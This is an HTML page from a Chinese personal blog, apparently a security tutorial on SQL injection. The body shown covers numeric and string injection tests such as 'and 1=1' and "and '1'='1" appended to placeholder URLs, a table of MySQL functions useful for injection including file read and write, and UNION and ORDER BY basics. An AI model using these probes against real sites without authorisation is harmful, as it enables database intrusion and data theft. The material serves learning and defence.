@@ -1,0 +1,959 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":true,"version":"8.17.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="SQL注入漏洞SQL注入漏洞简介SQL注入用户通过浏览器或者其他客户端将恶意SQL语句插入到网站参数中，网站应用程序未经过过滤，将恶意SQL语句带入数据库进行执行，通过数据库获取了敏感的信息或者执行了其他恶意操作。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入漏洞">
+<meta property="og:url" content="http://example.com/2023/08/21/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="lebuxishu的博客">
+<meta property="og:description" content="SQL注入漏洞SQL注入漏洞简介SQL注入用户通过浏览器或者其他客户端将恶意SQL语句插入到网站参数中，网站应用程序未经过过滤，将恶意SQL语句带入数据库进行执行，通过数据库获取了敏感的信息或者执行了其他恶意操作。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230812094610274.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230812095315721.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230821155851282.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230821155858214.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230821155902143.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230821160303100.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230821160316310.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230821160329198.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230821160337095.png">
+<meta property="article:published_time" content="2023-08-21T01:28:52.000Z">
+<meta property="article:modified_time" content="2023-08-21T09:05:37.024Z">
+<meta property="article:author" content="lebuxishu">
+<meta property="article:tag" content="Wed安全">
+<meta property="article:tag" content="SQL注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230812094610274.png">
+
+
+<link rel="canonical" href="http://example.com/2023/08/21/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2023/08/21/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","path":"2023/08/21/SQL注入漏洞/","title":"SQL注入漏洞"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>SQL注入漏洞 | lebuxishu的博客</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lebuxishu的博客</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">欢迎来到楽不吸鼠的博客💜</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.</span> <span class="nav-text">SQL注入漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="nav-number">1.1.</span> <span class="nav-text">SQL注入漏洞简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB"><span class="nav-number">1.2.</span> <span class="nav-text">SQL注入分类</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E5%8C%BA%E5%88%86"><span class="nav-number">1.3.</span> <span class="nav-text">如何区分</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%EF%BC%89%E6%95%B0%E5%AD%97%E5%9E%8B"><span class="nav-number">1.3.1.</span> <span class="nav-text">1）数字型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%EF%BC%89%E5%AD%97%E7%AC%A6%E5%9E%8B"><span class="nav-number">1.3.2.</span> <span class="nav-text">2）字符型</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL-Injection%E5%87%BD%E6%95%B0"><span class="nav-number">1.4.</span> <span class="nav-text">SQL Injection函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#information-schema%E5%BA%93"><span class="nav-number">1.5.</span> <span class="nav-text">information_schema库</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#union%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="nav-number">1.6.</span> <span class="nav-text">union联合查询</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#order-by%E8%AF%AD%E5%8F%A5"><span class="nav-number">1.6.1.</span> <span class="nav-text">order by语句</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bool%E6%B3%A8%E5%85%A5"><span class="nav-number">1.7.</span> <span class="nav-text">bool注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#substring%E5%87%BD%E6%95%B0"><span class="nav-number">1.7.1.</span> <span class="nav-text">substring函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ascii%E5%87%BD%E6%95%B0"><span class="nav-number">1.7.2.</span> <span class="nav-text">ascii函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sleep%E6%B3%A8%E5%85%A5"><span class="nav-number">1.8.</span> <span class="nav-text">sleep注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#if%E5%87%BD%E6%95%B0"><span class="nav-number">1.8.1.</span> <span class="nav-text">if函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">1.9.</span> <span class="nav-text">报错注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#updatexml%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">1.9.1.</span> <span class="nav-text">updatexml报错注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#extractvalue%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">1.9.2.</span> <span class="nav-text">extractvalue报错注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="nav-number">1.10.</span> <span class="nav-text">宽字节注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="nav-number">1.11.</span> <span class="nav-text">二次注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQLMAP"><span class="nav-number">1.12.</span> <span class="nav-text">SQLMAP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87"><span class="nav-number">1.13.</span> <span class="nav-text">SQL注入绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="nav-number">1.13.1.</span> <span class="nav-text">空格过滤绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E8%81%94%E6%B3%A8%E9%87%8A%E7%BB%95%E8%BF%87"><span class="nav-number">1.13.2.</span> <span class="nav-text">内联注释绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="nav-number">1.13.3.</span> <span class="nav-text">大小写绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8C%E5%86%99%E5%85%B3%E9%94%AE%E5%AD%97%E7%BB%95%E8%BF%87"><span class="nav-number">1.13.4.</span> <span class="nav-text">双写关键字绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-number">1.13.5.</span> <span class="nav-text">编码绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8C%E9%87%8Durl%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-number">1.13.5.1.</span> <span class="nav-text">双重url编码绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#16%E8%BF%9B%E5%88%B6%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-number">1.13.5.2.</span> <span class="nav-text">16进制编码绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Unicode%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-number">1.13.5.3.</span> <span class="nav-text">Unicode编码绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ASCII%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-number">1.13.5.4.</span> <span class="nav-text">ASCII编码绕过</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AD%89%E4%BB%B7%E5%87%BD%E6%95%B0%E5%AD%97%E7%AC%A6%E6%9B%BF%E6%8D%A2%E7%BB%95%E8%BF%87"><span class="nav-number">1.13.6.</span> <span class="nav-text">等价函数字符替换绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MySQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="nav-number">1.14.</span> <span class="nav-text">MySQL注入漏洞修复</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%B1%82%E4%BF%AE%E5%A4%8D"><span class="nav-number">1.14.1.</span> <span class="nav-text">代码层修复</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE%E4%BF%AE%E5%A4%8D"><span class="nav-number">1.14.2.</span> <span class="nav-text">服务器配置修复</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lebuxishu"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">lebuxishu</p>
+  <div class="site-description" itemprop="description">欢迎来到我的世界💜</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">8</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/lebuxishu" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;lebuxishu" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          链接
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <a href="https://sunwu57.github.io/" title="https:&#x2F;&#x2F;sunwu57.github.io&#x2F;" rel="noopener" target="_blank">sunwu57</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://github.com/next-theme/hexo-theme-next/tree/master" title="https:&#x2F;&#x2F;github.com&#x2F;next-theme&#x2F;hexo-theme-next&#x2F;tree&#x2F;master" rel="noopener" target="_blank">next-theme</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://huzisama.github.io/" title="https:&#x2F;&#x2F;huzisama.github.io&#x2F;" rel="noopener" target="_blank">狐梓</a>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/08/21/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="lebuxishu">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lebuxishu的博客">
+      <meta itemprop="description" content="欢迎来到我的世界💜">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="SQL注入漏洞 | lebuxishu的博客">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SQL注入漏洞
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2023-08-21 09:28:52 / 修改时间：17:05:37" itemprop="dateCreated datePublished" datetime="2023-08-21T09:28:52+08:00">2023-08-21</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">渗透</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>4.1k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>15 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h1><h2 id="SQL注入漏洞简介"><a href="#SQL注入漏洞简介" class="headerlink" title="SQL注入漏洞简介"></a>SQL注入漏洞简介</h2><p>SQL注入用户通过浏览器或者其他客户端将恶意SQL语句插入到网站参数中，网站应用程序未经过过滤，将恶意SQL语句带入数据库进行执行，通过数据库获取了敏感的信息或者执行了其他恶意操作。</p>
+<span id="more"></span>
+<ul>
+<li><strong>SQL注入攻击</strong>是目前web应用网络攻击中最常见的手段之一，曾被冠以 “<strong>漏洞之王</strong>” 的称号，其安全风险高于缓冲区溢出漏洞等所有其他漏洞，而市场上的防火墙又不能对SQL注入漏洞进行有效的检测和防范。</li>
+<li>SQL注入攻击普遍存在<strong>范围广</strong>、<strong>实现容易</strong>、<strong>破坏性大</strong>等特点。</li>
+</ul>
+<p><strong>结构化查询语言</strong>（Structured Query Language）简称 <strong>SQL</strong>，是一种特殊目的的编程语言，是一种数据库查询和程序设计语言，用于存取数据以及查询、更新和管理关系数据库系统。</p>
+<p><strong>SQL注入</strong>即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中<strong>事先定义好的查询语句的结尾</strong>后，<strong>添加额外的SQL语句</strong>，在管理员不知情的情况下实现<strong>非法操作</strong>，以此来实现欺骗数据库服务器执行<strong>非授权的任意查询</strong>，从而进一步得到相应的数据信息。</p>
+<p>简单来讲就是：<strong>攻击者通过构造不同的SQL语句来实现对数据库的操作</strong>。<br>此处<strong>两个关键条件</strong>：</p>
+<ul>
+<li><p><strong>参数</strong>用户可控 —— 即用户能够控制数据的输入</p>
+</li>
+<li><p>我们构造的参数可<strong>带入数据库执行</strong> —— 原本要执行的代码，<strong>拼接</strong>了用户的输入</p>
+</li>
+</ul>
+<p><strong>sql 注入的核心</strong></p>
+<p>  <strong>将用户输入的数据拼接到代码中，并被当成 sql 语句执行。</strong></p>
+<h2 id="SQL注入分类"><a href="#SQL注入分类" class="headerlink" title="SQL注入分类"></a>SQL注入分类</h2><p>通常sql 注入漏洞会被分为2种类型</p>
+<blockquote>
+<p>数字型<br>字符型</p>
+</blockquote>
+<h2 id="如何区分"><a href="#如何区分" class="headerlink" title="如何区分"></a>如何区分</h2><h3 id="1）数字型"><a href="#1）数字型" class="headerlink" title="1）数字型"></a>1）数字型</h3><p>当输入的参数x为整型的时候，通常<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=sql%E8%AF%AD%E5%8F%A5&spm=1001.2101.3001.7020">sql语句</a>是这样的</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> id =x</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这种类型可以使用经典的and 1&#x3D;1 and 1&#x3D;2来判断</p>
+</blockquote>
+<ul>
+<li>url地址中输入<a target="_blank" rel="noopener" href="http://www.xxxx.com/ccc.php?id=x">www.xxxx.com/ccc.php?id=x</a> and 1&#x3D;1<br>页面显示正常，继续下一步</li>
+<li>url地址中输入<a target="_blank" rel="noopener" href="http://www.xxxx.com/ccc.php?id=x">www.xxxx.com/ccc.php?id=x</a> and 1&#x3D;2<br>页面错误，这说明存在数字型注入。</li>
+<li>原因如下：<br>当输入and 1&#x3D;1时，后台会执行sql语句是</li>
+</ul>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> id =x <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span>；</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>没有语法显示错误且，返回正常</p>
+<p>当输入and 1&#x3D;2时，后台会执行sql语句是</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> id =<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span>;</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>没有语法错误且，返回错误</p>
+<ul>
+<li>我们在使用假设：<br>如果是字符型注入的话，我们输入的语句应该会出现这样的状况</li>
+</ul>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> id =<span class="string">&#x27;1 and 1=1&#x27;</span>; </span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> id =<span class="string">&#x27;1 and 1=2&#x27;</span>;</span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></table></figure>
+
+<p>查询语句将and语句全部转换成字符串，并没有进行and的逻辑判断，所以不会出现以上结果，所以这个等式是不成立的。</p>
+<h3 id="2）字符型"><a href="#2）字符型" class="headerlink" title="2）字符型"></a>2）字符型</h3><p>当输入的参数x为字符型时，通常sql语句会这样的</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> id =<span class="string">&#x27;x&#x27;</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这种类型我们可以使用and ‘1’&#x3D;’1 和 and ‘1’&#x3D;’2来进行测试</p>
+</blockquote>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://www.xxx.com/ccc.php?id=1%E2%80%99">www.xxx.com/ccc.php?id=1’</a> and ‘1’&#x3D;’1<br>页面正常，继续下一步</li>
+<li><a target="_blank" rel="noopener" href="http://www.xxx.com/ccc.php?id=1%E2%80%99">www.xxx.com/ccc.php?id=1’</a> and ‘1’&#x3D;’2<br>页面报错，则说明存在字符型注入。</li>
+<li>原因如下：<br>当输入and ‘1’&#x3D;‘1的时候，后台执行的语句是</li>
+</ul>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> id=<span class="string">&#x27;x&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1&#x27;</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>语法正确，逻辑判断正确，返回正确</p>
+<p>当输入and ‘1’&#x3D;‘2的时候，后台执行的语句是</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> id=<span class="string">&#x27;x&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;2&#x27;</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>语法正确，逻辑判断错误，返回错误</p>
+<p>字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的。</p>
+<h2 id="SQL-Injection函数"><a href="#SQL-Injection函数" class="headerlink" title="SQL Injection函数"></a>SQL Injection函数</h2><table>
+<thead>
+<tr>
+<th><strong>函数</strong> <strong>&#x2F;</strong> <strong>语句</strong></th>
+<th><strong>功能</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>user()</td>
+<td>当前用户名</td>
+</tr>
+<tr>
+<td>database()</td>
+<td>当前所用数据库</td>
+</tr>
+<tr>
+<td>current_user()</td>
+<td>当前用户名（可用来查看权限）</td>
+</tr>
+<tr>
+<td>version()</td>
+<td>数据库的版本</td>
+</tr>
+<tr>
+<td>@@datadir</td>
+<td>数据库的路径</td>
+</tr>
+<tr>
+<td>@@version_compile_os</td>
+<td>操作系统版本</td>
+</tr>
+<tr>
+<td>into dumpfile</td>
+<td>写文件操作</td>
+</tr>
+<tr>
+<td>into outfile</td>
+<td>写文件</td>
+</tr>
+<tr>
+<td>load_file()</td>
+<td>读文件操作</td>
+</tr>
+<tr>
+<td>concat(str1,str2..)</td>
+<td>连接字符串，连接两个或多个数组</td>
+</tr>
+<tr>
+<td>group_concat(str1,str2..)</td>
+<td>连接字符串，能将相同的行组合起来</td>
+</tr>
+<tr>
+<td>length（）</td>
+<td>计算字符串长度</td>
+</tr>
+<tr>
+<td>hex（）</td>
+<td>字符转换为16进制</td>
+</tr>
+<tr>
+<td>ord()</td>
+<td>字符转换为ASCII值</td>
+</tr>
+</tbody></table>
+<h2 id="information-schema库"><a href="#information-schema库" class="headerlink" title="information_schema库"></a>information_schema库</h2><p><img src="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230812094610274.png" alt="image-20230812094610274"></p>
+<h2 id="union联合查询"><a href="#union联合查询" class="headerlink" title="union联合查询"></a>union联合查询</h2><ul>
+<li>union操作符用于合并两个或多个select语句的结果集。</li>
+<li>联合查询中合并的选择查询必须具有相同的输出字段数、采用相同的顺序并包含相同或兼容的数据类型。</li>
+</ul>
+<h3 id="order-by语句"><a href="#order-by语句" class="headerlink" title="order by语句"></a>order by语句</h3><ul>
+<li>ORDER BY 语句用于根据指定的列对结果集进行排序。（判断列数）</li>
+<li>ORDER BY 语句默认按照升序对记录进行排序。</li>
+</ul>
